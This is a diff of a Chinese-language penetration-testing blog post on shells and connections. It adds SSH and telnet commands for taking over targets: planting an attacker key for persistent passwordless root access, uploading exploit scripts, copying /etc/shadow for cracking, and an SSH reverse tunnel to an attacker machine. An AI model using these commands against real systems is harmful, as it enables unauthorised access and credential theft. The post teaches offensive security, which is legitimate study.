@@ -28,6 +28,8 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106173303646.png">
 <meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106173841254.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251122210937815.png">
+<meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251122214542041.png">
 <meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106193859800.png">
 <meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106210456156.png">
 <meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106214349759.png">
@@ -56,7 +58,7 @@
 <meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251109181757154.png">
 <meta property="og:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251109182150144.png">
 <meta property="article:published_time" content="2025-11-06T08:58:09.000Z">
-<meta property="article:modified_time" content="2025-11-09T15:40:22.111Z">
+<meta property="article:modified_time" content="2025-11-22T14:03:42.188Z">
 <meta property="article:author" content="i4G5d">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://i4g5d.github.io/2025/11/06/shell/image-20251106173303646.png">
@@ -252,7 +254,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          13k 字
+          14k 字
         
       </span>
     
@@ -263,7 +265,7 @@
         
         
         
-          106 分钟
+          116 分钟
         
       </span>
     
@@ -322,25 +324,45 @@
 <p>反向代理通常用于均衡负载，SSL终!止，内容缓存，保护后端服务器和隐藏后端服务器身份等</p>
 <p><img src="/2025/11/06/shell/image-20251106173841254.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="2-连接-Shell"><a href="#2-连接-Shell" class="headerlink" title="2. 连接&amp;Shell"></a>2. 连接&amp;Shell</h1><h2 id="2-1-连接"><a href="#2-1-连接" class="headerlink" title="2.1 连接"></a>2.1 连接</h2><p>首先，先理解正向&#x2F;反向连接。正向连接是指由客户端向服务端发起连接请求，反之就是反向连接。</p>
-<h3 id="2-1-1-端口映射"><a href="#2-1-1-端口映射" class="headerlink" title="2.1.1 端口映射"></a>2.1.1 端口映射</h3><p>端口映射就是<strong>将内网中的主机的一个端口映射到路由器的公网ip的一个端口</strong>，提供相应的服务。当用户访问外网IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。<br>比如我们在内网中有一台Web服务器，但是外网中的用户是没有办法直接访问该服务器的。于是我们可以在路由器上设置一个端口映射，只要外网用户访问路由器ip的80端口，那么路由器会把自动把流量转到内网Web服务器的80端口上。并且，在路由器上还存在一个Session，当内网服务器返回数据给路由器时，路由器能准确的将消息发送给外网请求用户的主机。在这过程中，路由器充当了一个反向代理的作用，他保护了内网中主的主机</p>
-<h3 id="2-1-2-端口转发"><a href="#2-1-2-端口转发" class="headerlink" title="2.1.2 端口转发"></a>2.1.2 端口转发</h3><p>端口转发(Port forwarding)，有时被叫做隧道，是安全壳(SSH) 为网络安全通信使用的一种方法。端口转发是指通过路由器或防火墙，<strong>将外部访问请求（通常基于IP和端口号）转发到内网特定设备</strong>的技术。它是解决内网设备无法直接被外网访问的关键技术之一。</p>
+<h3 id="2-1-1SSH-telnet"><a href="#2-1-1SSH-telnet" class="headerlink" title="2.1.1SSH&#x2F;telnet"></a>2.1.1SSH&#x2F;telnet</h3><p>telnet基于TCP，SSH是加密的telnet，远程控制目标主机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">SSH root@192.168.1.100 <span class="hljs-comment"># 默认端口22，登录目标主机root用户，-p 2222可选端口</span><br>可先用nmap -sV -p22检查连接端口的状态<br>ssh root@192.168.1.100 <span class="hljs-string">&quot;ls /root&quot;</span>  <span class="hljs-comment"># 远程执行命令（无需登录，快速获取信息）</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/06/shell/image-20251122210937815.png" srcset="/img/loading.gif" lazyload></p>
+<p>免密登录（密钥对：id_rsa + id_rsa.pub  身份私钥+公钥。所以无论对方怎么改密码都没用）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">1. 本地生成SSH密钥对（Kali中执行，默认保存在~/.ssh/）</span><br>ssh-keygen -t rsa  # 生成RSA密钥，一路回车（无需设置密码，方便后续登录）<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. 将公钥上传到目标主机（需先知道目标用户名和口令，或已获得shell）</span><br>ssh-copy-id -i ~/.ssh/id_rsa.pub root@192.168.1.100  # 上传公钥到目标root用户的授权列表<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">3. 免密登录（后续无需输入口令，直接登录）</span><br>ssh root@192.168.1.100<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/06/shell/image-20251122214542041.png" srcset="/img/loading.gif" lazyload></p>
+<p>把我物理机的公钥发给虚拟机，在登录时就不需要密码了</p>
+<p>基于SSH的其他文件传输命令</p>
+<p>（上传漏洞利用工具（如 fscan）、恶意脚本，或下载目标主机的敏感数据（如数据库文件、配置文件）。）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">本地文件上传到目标主机</span><br>scp /kali/tools/nmap root@192.168.1.100:/tmp/  # 将Kali的nmap工具上传到目标/tmp目录<br><span class="hljs-meta prompt_"># </span><span class="language-bash">目标文件下载到本地</span><br>scp root@192.168.1.100:/etc/shadow /kali/loot/  # 下载目标shadow文件（破解口令用）<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">连接目标SFTP服务（默认与SSH同端口）</span><br>sftp root@192.168.1.100<br><span class="hljs-meta prompt_"># </span><span class="language-bash">常用SFTP命令（连接后执行）</span><br>put /kali/exploits/exp.sh /tmp/  # 上传本地漏洞利用脚本到目标/tmp<br>get /var/log/auth.log /kali/logs/  # 下载目标登录日志（分析登录记录）<br>ls  # 查看目标当前目录文件<br>cd  # 切换目标目录<br>lcd  # 切换本地目录<br></code></pre></td></tr></table></figure>
+
+<p>telnet常用于内网测试，默认端口：23</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">telnet 192.168.1.100  # 登录目标主机（默认端口23）<br>telnet 10.0.0.5 2323  # 目标Telnet端口为2323<br>telnet 192.168.1.100 80  # 测试目标80端口是否开放（Web服务）<br>telnet 10.0.0.5 3389  # 测试目标3389端口（RDP服务，Windows远程桌面）<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-1-2-端口映射"><a href="#2-1-2-端口映射" class="headerlink" title="2.1.2 端口映射"></a>2.1.2 端口映射</h3><p>端口映射就是<strong>将内网中的主机的一个端口映射到路由器的公网ip的一个端口</strong>，提供相应的服务。当用户访问外网IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。<br>比如我们在内网中有一台Web服务器，但是外网中的用户是没有办法直接访问该服务器的。于是我们可以在路由器上设置一个端口映射，只要外网用户访问路由器ip的80端口，那么路由器会把自动把流量转到内网Web服务器的80端口上。并且，在路由器上还存在一个Session，当内网服务器返回数据给路由器时，路由器能准确的将消息发送给外网请求用户的主机。在这过程中，路由器充当了一个反向代理的作用，他保护了内网中主的主机</p>
+<h3 id="2-1-3-端口转发"><a href="#2-1-3-端口转发" class="headerlink" title="2.1.3 端口转发"></a>2.1.3 端口转发</h3><p>端口转发(Port forwarding)，有时被叫做隧道，是安全壳(SSH) 为网络安全通信使用的一种方法。端口转发是指通过路由器或防火墙，<strong>将外部访问请求（通常基于IP和端口号）转发到内网特定设备</strong>的技术。它是解决内网设备无法直接被外网访问的关键技术之一。</p>
 <p>比如，我们现在在内网中，是没有办法直接访问外网的。但是我们可以通过路由器的NAT方式访问外网。假如我们内网现在有100台主机，那么我们现在都是通过路由器的这一个公网IP和外网通信的。那么，当互联网上的消息发送回来时，路由器是怎么知道这个消息是给他的，而另外消息是给你的呢?这就要我们的ip地址和路由器的端口进行绑定了，这时，在路由器中就会有一个内网ip和路由器端口对应的一张表。当路由器的10000端口收到消息时，就知道把消息发送给他，而当20000端口收到消息时，就知道把消息发送给你。这就是端口转发，其转发一个端口收到的流量，给另一个主机。</p>
-<h3 id="2-1-3-端口转发解决目标机器不出网"><a href="#2-1-3-端口转发解决目标机器不出网" class="headerlink" title="2.1.3 端口转发解决目标机器不出网"></a>2.1.3 端口转发解决目标机器不出网</h3><p><strong>端口转发</strong>可以让我们通过中间主机将特定流量转发到目标主机或从目标主机引导流量到外部网络。</p>
-<p><strong>本地端口转发（Local Port Forwarding）</strong>： 攻击者将目标主机的某些服务通过中间主机转发到攻击者的本地端口，这样攻击者可以像在本地访问这些服务一样。</p>
+<h3 id="2-1-4端口转发解决目标机器不出网"><a href="#2-1-4端口转发解决目标机器不出网" class="headerlink" title="2.1.4端口转发解决目标机器不出网"></a>2.1.4端口转发解决目标机器不出网</h3><p><strong>端口转发</strong>可以让我们通过中间主机将特定流量转发到目标主机或从目标主机引导流量到外部网络。</p>
+<p><strong>1. 本地端口转发（Local Port Forwarding）</strong>： 攻击者将目标主机的某些服务通过中间主机转发到攻击者的本地端口，这样攻击者可以像在本地访问这些服务一样。</p>
+<p>目标主机为内网主机（无法直接访问其他内网服务），通过 SSH 端口转发搭建跳板，访问目标内网的 Web、数据库等服务。</p>
 <p><strong>示例</strong>：通过SSH端口转发，访问目标内网中的数据库服务器。</p>
 <p><strong>命令示例</strong>：</p>
 <ul>
 <li><code>ssh -L 8080:target_internal_host:80 user@jump_host</code></li>
-<li>这将目标主机的80端口转发到攻击者本地的8080端口。</li>
+<li><code>ssh -L 8080:192.168.1.200:80 root@192.168.1.100  </code></li>
+<li>这将目标主机的80端口转发到攻击者本地的8080端口。本地访问<a href="http://127.0.0.1:8080即可访问目标内网Web。">http://127.0.0.1:8080即可访问目标内网Web。</a></li>
 <li>target_internal_host：目标主机</li>
 <li>jump_host：中间主机，即控制后做的代理主机</li>
 </ul>
-<p><strong>远程端口转发（Remote Port Forwarding）</strong>： 目标主机无法主动访问外部网络时，可以通过目标主机将流量反向转发到攻击者的主机。</p>
+<p><strong>2. 远程端口转发（Remote Port Forwarding）</strong>： 目标主机无法主动访问外部网络时，可以通过目标主机将流量反向转发到攻击者的主机。</p>
 <p>示例：当目标主机无法直接访问互联网，但攻击者主机可以通过目标主机来转发请求。这个命令需在目标机器上执行。</p>
 <p><strong>命令示例</strong>：</p>
 <ul>
-<li><code>ssh -R 8080:localhost:80 user@attacker_machine</code></li>
-<li>这将攻击者的8080端口转发给目标主机，使得目标主机可以通过攻击者的端口访问外部。</li>
+<li><code>ssh -R 8888:localhost:80 user@attacker_machine</code></li>
+<li>目标机子只要访问127.0.0.1:8888就能访问我的80端口</li>
 <li>localhost：靶机IP</li>
 <li>attacker_machine：攻击机IP</li>
 </ul>
